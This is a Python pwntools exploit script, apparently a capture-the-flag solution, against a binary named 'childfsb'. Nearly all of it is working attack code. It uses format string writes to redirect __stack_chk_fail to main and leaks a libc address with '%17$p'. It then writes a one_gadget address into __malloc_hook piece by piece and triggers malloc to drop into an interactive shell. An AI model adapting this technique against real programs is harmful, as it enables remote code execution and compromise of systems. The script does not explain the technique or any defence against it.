#!/usr/bin/python 
from pwn import *
from koharin import *

context.log_level = 'debug'
#p = remote("ctf.j0n9hyun.xyz", 3037)
p = process("./childfsb")
elf = ELF("./childfsb")
#libc = ELF("./libc.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
one_gadget_off = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
main = elf.symbols['main']
stack_chk_fail_got = elf.got['__stack_chk_fail']
# offset 6

# _stack_chk_fail -> main && libc leak
pay = fsb64(6, stack_chk_fail_got, main & 0xffff, 1)
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)

pay = '%17$p'
pay += 'A'*(0x19-len(pay))

p.sendafter("hello\n", pay)


# libc leak
p.recvuntil("0x")
leak = int('0x' + p.recv(12), 16)
log.info("__libc_start_main+240 : "+hex(leak))
libcBase = leak - libc.sym['__libc_start_main'] - 240
log.info("libcBase : "+hex(libcBase))
one_gadget = libcBase + one_gadget_off[2]
log.info("one_gadget : "+hex(one_gadget))
malloc_hook = libcBase + libc.symbols['__malloc_hook']

pay = fsb64(6, malloc_hook, one_gadget, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, malloc_hook+2, one_gadget>>16, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = fsb64(6, malloc_hook+4, one_gadget>>32, 1)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pay = '%10$p'
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

stack = int(p.recv(14), 16)

a = stack - 0x2d98
log.info("stack : "+hex(stack))
log.info("one_gadget : "+hex(one_gadget))
log.info("a : "+hex(a))

pay = fsb64(6, a, 0)
pay += 'A'*(0x19-len(pay))
p.sendafter("hello\n", pay)

pause()
p.sendafter("hello\n", "%10000000c")

p.interactive()

